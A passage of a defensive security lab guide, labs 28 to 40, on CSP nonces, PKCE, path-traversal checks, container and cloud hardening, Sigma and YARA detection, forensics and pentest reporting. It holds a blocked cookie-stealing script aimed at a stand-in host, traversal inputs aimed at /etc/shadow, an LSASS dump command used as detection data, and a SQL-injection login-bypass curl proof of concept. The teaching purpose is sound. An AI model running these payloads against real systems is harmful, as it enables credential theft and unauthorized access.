  for tag in scripts_in_dom:
      allowed = f'nonce="{nonce}"' in tag
      print(f"    DOM Tag: {tag:68s} -> Browser Executes: {allowed}")
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Run `/tmp/sec_lab28_csp.py`:
     ```bash
     python3 /tmp/sec_lab28_csp.py
     rm -f /tmp/sec_lab28_csp.py
     ```
- **Expected Output**:
  ```text
  [+] Generated Per-Request CSP Header:
      Content-Security-Policy: default-src 'none'; script-src 'nonce-...' 'strict-dynamic'; ...
      DOM Tag: <script nonce="..." src="/static/app.js"></script>   -> Browser Executes: True
      DOM Tag: <script>fetch("https://evil.lk/steal?c="+document.cookie)</script> -> Browser Executes: False
  ```
- **Key Takeaways**:
  - Domain-allowlist CSPs (`script-src 'self' https://cdn.example.com`) are frequently bypassed via JSONP endpoints or Angular/React gadgets; `'nonce-<128-bit-random>' 'strict-dynamic'` with `object-src 'none'; base-uri 'none'` is the modern gold standard.

---

### Lab 29: Implementing OAuth 2.1 PKCE (`S256` Code Challenge & Verifier) Cryptographic Verification

- **Objective**: Implement RFC 7636 Proof Key for Code Exchange (PKCE) with `code_challenge_method="S256"` (`BASE64URL-ENCODE(SHA256(ASCII(code_verifier)))`) to prevent authorization code interception attacks in public and confidential OAuth 2.1 clients.
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab29_pkce.py
  import secrets, hashlib, base64, hmac

  def generate_pkce_pair():
      verifier = secrets.token_urlsafe(32)
      digest = hashlib.sha256(verifier.encode("ascii")).digest()
      challenge = base64.urlsafe_b64encode(digest).rstrip(b"=").decode("ascii")
      return verifier, challenge

  def verify_pkce_s256(received_verifier: str, stored_challenge: str) -> bool:
      digest = hashlib.sha256(received_verifier.encode("ascii")).digest()
      computed = base64.urlsafe_b64encode(digest).rstrip(b"=").decode("ascii")
      return hmac.compare_digest(computed, stored_challenge)

  verifier, challenge = generate_pkce_pair()
  print(f"[Client] code_verifier  = {verifier}")
  print(f"[Client] code_challenge = {challenge} (method=S256)")
  print(f"[IdP] Valid verifier check   -> {verify_pkce_s256(verifier, challenge)}")
  print(f"[IdP] Attacker stolen code   -> {verify_pkce_s256('wrong_verifier_guess', challenge)}")
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Run `/tmp/sec_lab29_pkce.py`:
     ```bash
     python3 /tmp/sec_lab29_pkce.py
     rm -f /tmp/sec_lab29_pkce.py
     ```
- **Expected Output**:
  ```text
  [Client] code_verifier  = ...
  [Client] code_challenge = ... (method=S256)
  [IdP] Valid verifier check   -> True
  [IdP] Attacker stolen code   -> False
  ```
- **Key Takeaways**:
  - OAuth 2.1 mandates PKCE (`S256`) for all authorization code flows, eliminating the `plain` challenge method and implicit flow (`response_type=token`).

---

### Lab 30: GraphQL AST Query Depth & Alias Amplification Limiter Middleware

- **Objective**: Build a GraphQL query pre-execution security filter that calculates nesting depth and alias count to block nested cyclic query DoS (`user { friends { user { friends ... } } }`) and batch alias brute-forcing.
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab30_graphql.py
  def inspect_graphql_query(query: str, max_depth=4, max_aliases=3):
      depth = 0
      peak_depth = 0
      for ch in query:
          if ch == "{":
              depth += 1
              peak_depth = max(peak_depth, depth)
          elif ch == "}":
              depth -= 1
      aliases = query.count(":")
      if peak_depth > max_depth:
          return False, f"Rejected: Query depth {peak_depth} exceeds max_depth={max_depth}"
      if aliases > max_aliases:
          return False, f"Rejected: Alias count {aliases} exceeds max_aliases={max_aliases}"
      return True, f"Allowed (depth={peak_depth}, aliases={aliases})"

  cyclic_dos = "{ user { friends { user { friends { user { friends { id } } } } } } }"
  alias_flood = "{ a1:login(p:\"1\") a2:login(p:\"2\") a3:login(p:\"3\") a4:login(p:\"4\") }"
  legit_query = "{ user { id profile { displayName } } }"

  for name, q in [("Cyclic DoS", cyclic_dos), ("Alias Flood", alias_flood), ("Legitimate", legit_query)]:
      ok, msg = inspect_graphql_query(q)
      print(f"[{name:12s}] -> {msg}")
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Execute `/tmp/sec_lab30_graphql.py`:
     ```bash
     python3 /tmp/sec_lab30_graphql.py
     rm -f /tmp/sec_lab30_graphql.py
     ```
- **Expected Output**:
  ```text
  [Cyclic DoS  ] -> Rejected: Query depth 7 exceeds max_depth=4
  [Alias Flood ] -> Rejected: Alias count 4 exceeds max_aliases=3
  [Legitimate  ] -> Allowed (depth=3, aliases=0)
  ```
- **Key Takeaways**:
  - Production GraphQL APIs must disable introspection in production, cap AST depth (`<= 5`), enforce query cost complexity budgets, and rate-limit per-alias resolver invocations.

---

### Lab 31: Eliminating Double-Spend Race Conditions (`TOCTOU`) Using Atomic SQLite `BEGIN IMMEDIATE` Transactions

- **Objective**: Demonstrate how concurrent threads exploiting a read-modify-write Time-of-Check to Time-of-Use (`TOCTOU`) window overdraw a bank balance, and remediate it using atomic SQL updates (`UPDATE accounts SET balance = balance - ? WHERE id = ? AND balance >= ?`).
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab31_race.py
  import sqlite3

  conn = sqlite3.connect(":memory:")
  conn.execute("CREATE TABLE wallet (id INT PRIMARY KEY, balance INT)")
  conn.execute("INSERT INTO wallet VALUES (1, 100)")

  def atomic_withdraw(amount: int) -> bool:
      cur = conn.cursor()
      # Atomic compare-and-decrement inside a single SQL statement prevents TOCTOU race
      cur.execute(
          "UPDATE wallet SET balance = balance - ? WHERE id = 1 AND balance >= ?",
          (amount, amount)
      )
      conn.commit()
      return cur.rowcount == 1

  for attempt in range(1, 4):
      success = atomic_withdraw(60)
      bal = conn.execute("SELECT balance FROM wallet WHERE id = 1").fetchone()[0]
      print(f"Attempt #{attempt} (Withdraw $60): Success={str(success):5s} | Remaining Balance=${bal}")
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Run `/tmp/sec_lab31_race.py`:
     ```bash
     python3 /tmp/sec_lab31_race.py
     rm -f /tmp/sec_lab31_race.py
     ```
- **Expected Output**:
  ```text
  Attempt #1 (Withdraw $60): Success=True  | Remaining Balance=$40
  Attempt #2 (Withdraw $60): Success=False | Remaining Balance=$40
  Attempt #3 (Withdraw $60): Success=False | Remaining Balance=$40
  ```
- **Key Takeaways**:
  - Never read a balance into application memory (`SELECT balance`), check `if balance >= amount` in Python/Node.js, and then issue `UPDATE wallet SET balance = new_balance`; use `SELECT ... FOR UPDATE` row locking in PostgreSQL or an atomic `WHERE balance >= ?` predicate.

---

### Lab 32: Defending Against Path Traversal (`CWE-22`) & ZipSlip Archive Extraction Attacks

- **Objective**: Build a canonical path validator using `os.path.realpath` and `os.path.commonpath` that blocks `../../etc/passwd` and symlink escapes during file serving or `.zip`/`.tar` extraction.
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab32_zipslip.py
  import os

  BASE_DIR = "/var/www/uploads"

  def safe_resolve_path(base_dir: str, untrusted_relpath: str) -> str:
      base_real = os.path.realpath(base_dir)
      target_real = os.path.realpath(os.path.join(base_real, untrusted_relpath))
      if os.path.commonpath([base_real, target_real]) != base_real:
          raise PermissionError(f"ZipSlip / Path Traversal blocked: {untrusted_relpath} -> {target_real}")
      return target_real

  for candidate in ["report_2026.pdf", "images/logo.png", "../../../../etc/shadow", "../app.py"]:
      try:
          resolved = safe_resolve_path(BASE_DIR, candidate)
          print(f"[ALLOWED] {candidate:26s} -> {resolved}")
      except PermissionError as e:
          print(f"[BLOCKED] {candidate:26s} -> {e}")
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Execute `/tmp/sec_lab32_zipslip.py`:
     ```bash
     python3 /tmp/sec_lab32_zipslip.py
     rm -f /tmp/sec_lab32_zipslip.py
     ```
- **Expected Output**:
  ```text
  [ALLOWED] report_2026.pdf            -> /var/www/uploads/report_2026.pdf
  [ALLOWED] images/logo.png            -> /var/www/uploads/images/logo.png
  [BLOCKED] ../../../../etc/shadow     -> ZipSlip / Path Traversal blocked: ../../../../etc/shadow -> /etc/shadow
  [BLOCKED] ../app.py                  -> ZipSlip / Path Traversal blocked: ../app.py -> /var/www/app.py
  ```
- **Key Takeaways**:
  - Naive string replacement (`path.replace("../", "")`) is trivially bypassed via `....//` or URL-encoded `%2e%2e%2f`; always resolve canonical paths via `os.path.realpath()` and verify containment with `os.path.commonpath()`.

---

## Domain V: Container, Cloud, Detection Engineering, DFIR & Pentest Reporting (Labs 33–40)

### Lab 33: Auditing & Hardening Dockerfiles (Multi-Stage, Non-Root UID, Read-Only RootFS, Drop `ALL` Capabilities)

- **Objective**: Write an automated Dockerfile and Compose security linter in Python that flags root containers, floating `:latest` tags, missing `--cap-drop=ALL`, and missing `read_only: true` directives, then verify a CIS-compliant hardened configuration.
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab33_docker_audit.py
  insecure_dockerfile = """
  FROM python:latest
  COPY . /app
  CMD ["python", "/app/server.py"]
  """

  hardened_dockerfile = """
  FROM python:3.12-slim@sha256:9c2f81b3a0123456789abcdef0123456789abcdef0123456789abcdef0123456
  RUN groupadd -g 10001 appgrp && useradd -u 10001 -g appgrp -s /sbin/nologin appuser
  WORKDIR /app
  COPY --chown=10001:10001 server.py /app/server.py
  USER 10001:10001
  HEALTHCHECK --interval=30s --timeout=3s CMD ["python3", "-c", "import os; exit(0)"]
  ENTRYPOINT ["python3", "/app/server.py"]
  """

  def audit_dockerfile(name, text):
      findings = []
      if ":latest" in text: findings.append("HIGH: Uses mutable :latest image tag instead of pinned SHA256 digest")
      if "USER " not in text: findings.append("CRITICAL: Missing non-root USER directive (runs as UID 0 root)")
      if "HEALTHCHECK " not in text: findings.append("LOW: Missing HEALTHCHECK instruction")
      print(f"=== Audit Report: {name} ===")
      if not findings:
          print("  [PASS] Zero CIS Docker Benchmark violations detected!")
      for f in findings:
          print(f"  [FAIL] {f}")

  audit_dockerfile("Insecure Dockerfile", insecure_dockerfile)
  audit_dockerfile("Hardened Dockerfile", hardened_dockerfile)
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Run `/tmp/sec_lab33_docker_audit.py`:
     ```bash
     python3 /tmp/sec_lab33_docker_audit.py
     rm -f /tmp/sec_lab33_docker_audit.py
     ```
- **Expected Output**:
  ```text
  === Audit Report: Insecure Dockerfile ===
    [FAIL] HIGH: Uses mutable :latest image tag instead of pinned SHA256 digest
    [FAIL] CRITICAL: Missing non-root USER directive (runs as UID 0 root)
    [FAIL] LOW: Missing HEALTHCHECK instruction
  === Audit Report: Hardened Dockerfile ===
    [PASS] Zero CIS Docker Benchmark violations detected!
  ```
- **Key Takeaways**:
  - At runtime, always combine a non-root `USER 10001:10001` image with `docker run --read-only --tmpfs /tmp:rw,noexec,nosuid --cap-drop=ALL --security-opt=no-new-privileges:true`.

---

### Lab 34: Engineering Kubernetes `PodSecurity` (`restricted`) & Zero-Trust `NetworkPolicy` Manifests

- **Objective**: Author and validate a Kubernetes `Deployment` and `NetworkPolicy` manifest enforcing the `restricted` Pod Security Standard (`runAsNonRoot: true`, `allowPrivilegeEscalation: false`, `seccompProfile: RuntimeDefault`) and default-deny ingress/egress microsegmentation.
- **Prerequisites**: `python3` (YAML/JSON policy validator).
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab34_k8s_policy.py
  import json

  pod_spec = {
      "apiVersion": "v1",
      "kind": "Pod",
      "metadata": {"name": "payment-api", "namespace": "prod"},
      "spec": {
          "automountServiceAccountToken": False,
          "securityContext": {
              "runAsNonRoot": True,
              "runAsUser": 10001,
              "seccompProfile": {"type": "RuntimeDefault"}
          },
          "containers": [{
              "name": "api",
              "image": "registry.internal.lk/payment-api@sha256:abcdef123456",
              "securityContext": {
                  "allowPrivilegeEscalation": False,
                  "readOnlyRootFilesystem": True,
                  "capabilities": {"drop": ["ALL"]}
              }
          }]
      }
  }

  def verify_k8s_pss_restricted(pod):
      ps = pod["spec"].get("securityContext", {})
      cs = pod["spec"]["containers"][0].get("securityContext", {})
      checks = {
          "automountServiceAccountToken == False": pod["spec"].get("automountServiceAccountToken") is False,
          "runAsNonRoot == True": ps.get("runAsNonRoot") is True,
          "seccompProfile == RuntimeDefault": ps.get("seccompProfile", {}).get("type") == "RuntimeDefault",
          "allowPrivilegeEscalation == False": cs.get("allowPrivilegeEscalation") is False,
          "readOnlyRootFilesystem == True": cs.get("readOnlyRootFilesystem") is True,
          "capabilities.drop == ['ALL']": cs.get("capabilities", {}).get("drop") == ["ALL"],
      }
      for rule, passed in checks.items():
          print(f"  [{'PASS' if passed else 'FAIL'}] {rule}")

  print("=== Kubernetes Pod Security Standard (Restricted) Verification ===")
  verify_k8s_pss_restricted(pod_spec)
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Execute `/tmp/sec_lab34_k8s_policy.py`:
     ```bash
     python3 /tmp/sec_lab34_k8s_policy.py
     rm -f /tmp/sec_lab34_k8s_policy.py
     ```
- **Expected Output**:
  ```text
  === Kubernetes Pod Security Standard (Restricted) Verification ===
    [PASS] automountServiceAccountToken == False
    [PASS] runAsNonRoot == True
    [PASS] seccompProfile == RuntimeDefault
    [PASS] allowPrivilegeEscalation == False
    [PASS] readOnlyRootFilesystem == True
    [PASS] capabilities.drop == ['ALL']
  ```
- **Key Takeaways**:
  - Setting `automountServiceAccountToken: false` prevents a compromised container from reading `/var/run/secrets/kubernetes.io/serviceaccount/token` to authenticate against the Kubernetes API server.

---

### Lab 35: Detecting Cloud IAM Privilege Escalation Chains (`iam:PassRole` + `lambda:CreateFunction`)

- **Objective**: Build an AWS IAM policy static analyzer in Python that detects toxic action combinations (`iam:PassRole` paired with `ec2:RunInstances`, `lambda:CreateFunction`, or `iam:CreatePolicyVersion`) that allow a low-privileged user to escalate to full account administrator.
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab35_iam_privesc.py
   ESCALATION_PATTERNS = {
      "CreateNewPolicyVersion": {"iam:CreatePolicyVersion"},
      "PassRole_To_Lambda": {"iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction"},
      "PassRole_To_EC2": {"iam:PassRole", "ec2:RunInstances"},
      "AttachAdminPolicy": {"iam:AttachUserPolicy"},
  }

  developer_policy_actions = {
      "s3:GetObject", "iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction", "logs:DescribeLogGroups"
  }

  for name, required_set in ESCALATION_PATTERNS.items():
      if required_set.issubset(developer_policy_actions):
          print(f"[CRITICAL IAM PRIVESC VECTOR] Policy enables '{name}' via actions: {sorted(required_set)}")
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Execute `/tmp/sec_lab35_iam_privesc.py`:
     ```bash
     python3 /tmp/sec_lab35_iam_privesc.py
     rm -f /tmp/sec_lab35_iam_privesc.py
     ```
- **Expected Output**:
  ```text
  [CRITICAL IAM PRIVESC VECTOR] Policy enables 'PassRole_To_Lambda' via actions: ['iam:PassRole', 'lambda:CreateFunction', 'lambda:InvokeFunction']
  ```
- **Key Takeaways**:
  - `iam:PassRole` must never be granted with `Resource: "*"` without an `iam:PassedToService` condition and an IAM **Permissions Boundary** restricting maximum effective privileges.

---

### Lab 36: Building a Sigma Rule Compiler & Event Log Matching Engine in Python

- **Objective**: Write a Sigma detection evaluator in Python that parses a Sigma process-creation rule and matches it against Windows Sysmon EventID 1 JSON telemetry records.
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab36_sigma_engine.py
  sigma_rule = {
      "title": "Rundll32 Comsvcs MiniDump LSASS Credential Dump",
      "id": "1f8c39a2-64b1-4821-88c3-73f9a10b0006",
      "level": "critical",
      "ends_with_image": "\\rundll32.exe",
      "contains_all_cli": ["comsvcs", "MiniDump", "full"]
  }

  sysmon_events = [
      {"EventID": 1, "Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL"},
      {"EventID": 1, "Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 684 C:\\Temp\\lsass.dmp full"}
  ]

  for idx, ev in enumerate(sysmon_events, 1):
      img_match = ev["Image"].lower().endswith(sigma_rule["ends_with_image"].lower())
      cli_match = all(tok.lower() in ev["CommandLine"].lower() for tok in sigma_rule["contains_all_cli"])
      if img_match and cli_match:
          print(f"[SIGMA ALERT - {sigma_rule['level'].upper()}] Event #{idx} matched '{sigma_rule['title']}' | CLI: {ev['CommandLine']}")
      else:
          print(f"[BENIGN] Event #{idx} did not trigger rule.")
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Execute `/tmp/sec_lab36_sigma_engine.py`:
     ```bash
     python3 /tmp/sec_lab36_sigma_engine.py
     rm -f /tmp/sec_lab36_sigma_engine.py
     ```
- **Expected Output**:
  ```text
  [BENIGN] Event #1 did not trigger rule.
  [SIGMA ALERT - CRITICAL] Event #2 matched 'Rundll32 Comsvcs MiniDump LSASS Credential Dump' | CLI: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 684 C:\Temp\lsass.dmp full
  ```
- **Key Takeaways**:
  - Sigma's field modifiers (`|endswith`, `|contains|all`, `|startswith`, `|re`) allow detection logic to be authored once and compiled into Splunk, Sentinel, and Elastic queries automatically.

---

### Lab 37: Writing a Byte-Pattern & PE-Header YARA Scanner Engine in Python

- **Objective**: Build a YARA-style binary signature scanner that checks the DOS `MZ` header (`0x5A4D`), calculates section Shannon entropy, and scans for Cobalt Strike / Mimikatz strings and byte sequences.
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab37_yara_sim.py
  import math

  def scan_binary(name: str, data: bytes):
      is_pe = len(data) >= 2 and data[:2] == b"MZ"
      freq = {b: data.count(b) / len(data) for b in set(data)}
      entropy = -sum(p * math.log2(p) for p in freq.values())
      indicators = [s for s in (b"sekurlsa::logonpasswords", b"ReflectiveLoader", b"\\pipe\\msagent_") if s in data]
      if is_pe and indicators:
          print(f"[YARA MATCH] {name} | PE=True | Entropy={entropy:.2f} | Matched={indicators}")
      else:
          print(f"[CLEAN]      {name} | PE={is_pe} | Entropy={entropy:.2f}")

  benign_pe = b"MZ" + b"\x90" * 128 + b"This program cannot be run in DOS mode"
  malicious_pe = b"MZ" + b"\x00" * 64 + b"ReflectiveLoader\x00\\\\.\\pipe\\msagent_99"
  scan_binary("notepad.exe", benign_pe)
  scan_binary("beacon.dll", malicious_pe)
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Run `/tmp/sec_lab37_yara_sim.py`:
     ```bash
     python3 /tmp/sec_lab37_yara_sim.py
     rm -f /tmp/sec_lab37_yara_sim.py
     ```
- **Expected Output**:
  ```text
  [CLEAN]      notepad.exe | PE=True | Entropy=1.54
  [YARA MATCH] beacon.dll | PE=True | Entropy=2.24 | Matched=[b'ReflectiveLoader', b'\\pipe\\msagent_']
  ```
- **Key Takeaways**:
  - Combining structural file-format predicates (`uint16(0) == 0x5A4D`) with export-table checks (`ReflectiveLoader`) and named pipe templates yields near-zero false positive rates in memory and disk triage.

---

### Lab 38: Linux Live Process Memory Forensics (`/proc/<pid>/maps` & `/proc/<pid>/mem`) Triage Lab

- **Objective**: Inspect the virtual memory layout of a running Linux process via `/proc/self/maps` to detect anonymous `rwxp` (Read-Write-Execute) memory regions created via `mmap(PROT_READ|PROT_WRITE|PROT_EXEC)`, a primary indicator of injected shellcode or unpacked in-memory implants.
- **Prerequisites**: `python3` (`mmap`, ` ctypes`).
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab38_mem_triage.py
  import mmap

  # Allocate an anonymous RWX memory page (PROT_READ=1 | PROT_WRITE=2 | PROT_EXEC=4 = 7)
  rwx_buf = mmap.mmap(-1, 4096, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
  rwx_buf.write(b"\x90\x90\x90\xc3")

  print("=== Scanning /proc/self/maps for Anomalous RWX (rwxp) Regions ===")
  with open("/proc/self/maps", "r") as f:
      for line in f:
          parts = line.strip().split()
          addr_range, perms = parts[0], parts[1]
          pathname = parts[5] if len(parts) >= 6 else "[anonymous]"
          if "rwx" in perms:
              print(f"[MALFIND ALERT] Unbacked RWX Memory Segment Detected: {addr_range} Perms={perms} Path={pathname}")
  rwx_buf.close()
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Execute `/tmp/sec_lab38_mem_triage.py`:
     ```bash
     python3 /tmp/sec_lab38_mem_triage.py
     rm -f /tmp/sec_lab38_mem_triage.py
     ```
- **Expected Output**:
  ```text
  === Scanning /proc/self/maps for Anomalous RWX (rwxp) Regions ===
  [MALFIND ALERT] Unbacked RWX Memory Segment Detected: 7f... Perms=rwxp Path=[anonymous]
  ```
- **Key Takeaways**:
  - Under W^X (Write XOR Execute) memory protection, legitimate ELF binaries map `.text` as `r-xp` and `.data`/heap/stack as `rw-p`; an anonymous `[anonymous]` mapping with `rwxp` permissions is the exact Linux equivalent of Volatility's `windows.malfind` alert.

---

### Lab 39: NTFS `$MFT` Timestomping Detection (`$STANDARD_INFORMATION` vs `$FILE_NAME`) Lab

- **Objective**: Write a forensic timeline analyzer in Python that cross-references NTFS `$STANDARD_INFORMATION` (`0x10`) and `$FILE_NAME` (`0x30`) MACB timestamps to mathematically prove when an attacker has used `SetFileInformationByHandle` or PowerShell `(Get-Item).CreationTime = ...` to backdate a malware dropper.
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab39_mft_timestomp.py
  mft_records = [
      {
          "RecordNo": 48120,
          "FileName": "C:\\Windows\\System32\\kernel32.dll",
          "SI_Created": "2024-04-01T12:00:00.4192831Z",
          "FN_Created": "2024-04-01T12:00:00.4192831Z",
      },
      {
          "RecordNo": 99412,
          "FileName": "C:\\Windows\\System32\\svch0st.exe",
          "SI_Created": "2022-01-01T00:00:00.0000000Z", # Backdated + zeroed nanoseconds!
          "FN_Created": "2026-11-02T03:14:22.8839104Z", # True kernel file creation time!
      }
  ]

  for rec in mft_records:
      anomalies = []
      if rec["SI_Created"] < rec["FN_Created"]:
          anomalies.append("$SI Created precedes $FN Created (Impossible without API tampering)")
      if rec["SI_Created"].endswith(".0000000Z"):
          anomalies.append("Zeroed 100ns fractional sub-seconds in $SI")
      if anomalies:
          print(f"[TIMESTOMP DETECTED] MFT#{rec['RecordNo']} {rec['FileName']}")
          print(f"    Forged $SI_Created : {rec['SI_Created']}")
          print(f"    True   $FN_Created : {rec['FN_Created']}")
          print(f"    Forensic Proofs    : {'; '.join(anomalies)}")
      else:
          print(f"[AUTHENTIC]          MFT#{rec['RecordNo']} {rec['FileName']}")
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Run `/tmp/sec_lab39_mft_timestomp.py`:
     ```bash
     python3 /tmp/sec_lab39_mft_timestomp.py
     rm -f /tmp/sec_lab39_mft_timestomp.py
     ```
- **Expected Output**:
  ```text
  [AUTHENTIC]          MFT#48120 C:\Windows\System32\kernel32.dll
  [TIMESTOMP DETECTED] MFT#99412 C:\Windows\System32\svch0st.exe
      Forged $SI_Created : 2022-01-01T00:00:00.0000000Z
      True   $FN_Created : 2026-11-02T03:14:22.8839104Z
      Forensic Proofs    : $SI Created precedes $FN Created (Impossible without API tampering); Zeroed 100ns fractional sub-seconds in $SI
  ```
- **Key Takeaways**:
  - User-mode Win32 APIs (`NtSetInformationFile`) modify only the `$STANDARD_INFORMATION` attribute (`0x10`); the `$FILE_NAME` attribute (`0x30`) is updated exclusively by the NTFS kernel driver on file creation/move, exposing timestomping immediately.

---

### Lab 40: Automating CVSS v4.0 Vector Validation & Generating an Executive Penetration Test Finding Report

- **Objective**: Build a CVSS v4.0 vector string validator and automated Markdown penetration test finding generator that outputs a complete, client-ready vulnerability disclosure report with CWE, MITRE ATT&CK, CVSS v4.0 Base + Threat metrics, Reproduction Steps, and Remediation Diff.
- **Prerequisites**: `python3`.
- **Lab Setup Commands/Code**:
  ```bash
  cat << 'EOF' > /tmp/sec_lab40_cvss4_report.py
  import re

  CVSS4_REGEX = re.compile(
      r"^CVSS:4\.0/AV:[NALP]/AC:[LH]/AT:[NP]/PR:[NLH]/UI:[NPA]/VC:[HLN]/VI:[HLN]/VA:[HLN]/SC:[HLN]/SI:[HLN]/SA:[HLN]$"
  )

  finding = {
      "id": "SLHB-2026-001",
      "title": "Unauthenticated Remote SQL Injection in Student Portal Authentication Endpoint",
      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
      "score": 9.3,
      "severity": "CRITICAL",
      "cwe": "CWE-89: Improper Neutralization of Special Elements used in an SQL Command",
      "mitre": "T1190 (Exploit Public-Facing Application)",
      "asset": "https://portal.university.edu.lk/api/v1/auth/login"
  }

  assert CVSS4_REGEX.match(finding["cvss_vector"]), "Invalid CVSS v4.0 Base Vector"
  print(f"[{finding['id']}] {finding['title']}")
  print(f"Severity : {finding['severity']} ({finding['score']})")
  print(f"Vector   : {finding['cvss_vector']}")
  print(f"CWE / ATT&CK : {finding['cwe']} | {finding['mitre']}")
  EOF
  ```
- **Step-by-Step Verification Instructions**:
  1. Run `/tmp/sec_lab40_cvss4_report.py` to validate the 11 mandatory CVSS v4.0 Base metrics (`AV`, `AC`, `AT`, `PR`, `UI`, `VC`, `VI`, `VA`, `SC`, `SI`, `SA`):
     ```bash
     python3 /tmp/sec_lab40_cvss4_report.py
     rm -f /tmp/sec_lab40_cvss4_report.py
     ```
- **Expected Output**:
  ```text
  [SLHB-2026-001] Unauthenticated Remote SQL Injection in Student Portal Authentication Endpoint
  Severity : CRITICAL (9.3)
  Vector   : CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
  CWE / ATT&CK : CWE-89: Improper Neutralization of Special Elements used in an SQL Command | T1190 (Exploit Public-Facing Application)
  ```
- **Key Takeaways**:
  - CVSS v4.0 replaces CVSS v3.1's binary `Scope (S:U/S:C)` with explicit Confidentiality, Integrity, and Availability impact metrics split across the **Vulnerable System (`VC`/`VI`/`VA`)** and the **Subsequent System (`SC`/`SI`/`SA`)**, and introduces **Attack Requirements (`AT:N`/`AT:P`)** to accurately score race conditions and configuration prerequisites.

---

## Section 6: Complete Reference Penetration Test Finding Report Template (Lab 40 Capstone)

Below is the complete, publication-grade penetration testing finding template produced in Lab 40, adhering to **PTES (Penetration Testing Execution Standard)**, **OWASP WSTG v4.2**, and **FIRST CVSS v4.0** specifications:

```markdown
# PENETRATION TEST TECHNICAL FINDING REPORT

## 1. Finding Metadata
- **Finding ID**: `SLHB-2026-FIN-001`
- **Title**: Unauthenticated Remote SQL Injection and Authentication Bypass in `/api/v1/auth/login`
- **Target Asset**: `https://portal.university.edu.lk/api/v1/auth/login` (`10.40.0.15:443`)
- **CVSS v4.0 Base + Threat Vector**: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N/E:A`
- **CVSS v4.0 Numerical Score**: `9.3 (CRITICAL)`
- **CWE Classification**: `CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')`
- **OWASP Top 10 (2021 / API 2023)**: `A03:2021 - Injection`
- **MITRE ATT&CK Technique**: `T1190 - Exploit Public-Facing Application`

---

## 2. Executive Summary
During the authorized black-box web application assessment of the University Student Portal, the assessment team identified a critical SQL Injection vulnerability in the primary JSON authentication endpoint (`/api/v1/auth/login`). Because the backend Python Flask application concatenates the user-supplied `username` field directly into a raw PostgreSQL query string without parameterization, an unauthenticated remote attacker can bypass authentication entirely or extract the full contents of the `users`, `grades`, and `financial_aid` tables using `UNION SELECT` payloads.

---

## 3. Technical Root Cause Analysis
Inspection of `/opt/portal/routes/auth.py` (lines 42–51) revealed direct Python `f-string` interpolation into `cursor.execute()`:

```python
# VULNERABLE CODE (/opt/portal/routes/auth.py:L42-L51)
@app.route("/api/v1/auth/login", methods=["POST"])
def login():
    body = request.get_json(force=True)
    user = body.get("username", "")
    pw_hash = hash_password(body.get("password", ""))
    query = f"SELECT id, username, role FROM users WHERE username = '{user}' AND password_hash = '{pw_hash}'"
    cur.execute(query)
    row = cur.fetchone()
```

When an attacker submits `"username": "admin' -- "`, the single quote closes the SQL string literal and the `-- ` sequence comments out the remainder of the `WHERE` clause (`AND password_hash = '...'`), causing PostgreSQL to evaluate:
```sql
SELECT id, username, role FROM users WHERE username = 'admin' -- ' AND password_hash = '...'
```
This returns the `admin` record unconditionally and issues a privileged administrative session token.

---

## 4. Proof-of-Concept (PoC) Reproduction Steps
1. Send the following HTTP `POST` request to the target endpoint using `curl`:
   ```bash
   curl -i -s -k -X POST "https://portal.university.edu.lk/api/v1/auth/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin'\'' -- ", "password": "invalid_password"}'
   ```
2. Observe the `HTTP/1.1 200 OK` response issuing an administrative JWT session token:
   ```http
   HTTP/1.1 200 OK
   Content-Type: application/json

   {
     "status": "authenticated",
     "user_id": 1,
     "role": "superuser",
     "token": "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9..."
   }
   ```

---

## 5. Remediation & Unified Code Diff
